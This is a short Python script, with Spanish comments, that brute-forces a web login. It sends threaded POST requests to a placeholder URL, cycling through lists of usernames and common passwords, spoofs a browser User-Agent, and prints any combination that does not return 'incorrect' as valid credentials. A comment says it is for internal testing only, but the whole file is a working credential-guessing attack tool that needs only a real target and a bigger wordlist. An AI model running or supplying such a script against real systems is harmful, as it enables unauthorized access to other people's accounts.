import requests
import threading

# URL de la aplicación objetivo (solo pruebas internas)
url = "https://example.com/login"

# Credenciales de prueba
usuarios = ["admin", "user1", "test"]
passwords = ["123456", "password", "admin123"]

# Headers para simular navegador (MEJORA)
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Función para probar login con credenciales
def intentar_login(usuario, password):
    try:
        data = {"username": usuario, "password": password}
        response = requests.post(url, data=data, headers=headers, timeout=5)

        if "incorrect" not in response.text:
            print(f"[+] Credenciales correctas: {usuario}:{password}")
        else:
            print(f"[-] Fallo: {usuario}:{password}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error en la petición: {e}")

# Crear múltiples hilos para probar credenciales en paralelo
hilos = []

for usuario in usuarios:
    for password in passwords:
        t = threading.Thread(target=intentar_login, args=(usuario, password))
        hilos.append(t)
        t.start()

# Esperar a que todos los hilos terminen
for t in hilos:
    t.join()
